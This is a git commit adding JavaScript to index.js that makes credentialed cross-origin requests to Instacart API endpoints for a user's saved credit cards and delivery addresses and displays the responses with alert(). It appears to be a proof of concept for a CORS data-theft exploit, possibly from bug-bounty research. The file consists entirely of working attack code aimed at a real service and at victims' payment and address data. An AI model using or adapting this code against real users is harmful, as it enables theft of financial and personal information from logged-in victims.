74a44cab9c2c0b1dd95a173dcb74a7b62a6b8d2e
Green <green.epita2016@gmail.com>
2020-08-31 10:59:14 +0200

    go

--- index.js
+++ index.js
@@ -1,10 +1,20 @@
+// 1 - Credit cards
 var xhr = new XMLHttpRequest();
 xhr.onreadystatechange = function() {
 	if (xhr.readyState == XMLHttpRequest.DONE) {
 		alert(xhr.responseText);
-		//alert(xhr.getAllResponseHeaders())
 	}
 }
 xhr.withCredentials = true;
 xhr.open('GET', 'https://www.instacart.com/api/v2/credit_cards?source=web', true);
 xhr.send(null)
+// 2 - Addresses
+var xhr2 = new XMLHttpRequest();
+xhr2.onreadystatechange = function() {
+	if (xhr2.readyState == XMLHttpRequest.DONE) {
+		alert(xhr2.responseText);
+	}
+}
+xhr2.withCredentials = true;
+xhr2.open('GET', 'https://www.instacart.com/v3/addresses', true);
+xhr2.send(null)
